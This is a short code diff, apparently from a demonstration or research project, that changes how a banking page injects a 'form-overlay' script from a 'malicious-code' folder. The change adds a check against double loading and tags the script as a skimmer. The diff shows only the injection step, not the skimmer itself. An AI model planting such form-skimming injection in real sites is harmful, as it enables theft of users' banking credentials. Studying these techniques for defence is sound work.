@@ -791,9 +791,14 @@
   }
 
   // ===== Injection for form-overlay.js =====
-  const overlayScript = document.createElement('script')
-  overlayScript.src =  '../malicious-code/form-overlay.js'
-  document.body.appendChild(overlayScript)
+  // banking.html already loads the selected variant via malicious-code/<variant>.js;
+  // only inject here if form-overlay wasn't already loaded, to avoid double-execution.
+  if (!document.querySelector('script[data-skimmer="form-overlay"]')) {
+    const overlayScript = document.createElement('script')
+    overlayScript.src = 'malicious-code/form-overlay.js'
+    overlayScript.setAttribute('data-skimmer', 'form-overlay')
+    document.body.appendChild(overlayScript)
+  }
 })()
 
 /**
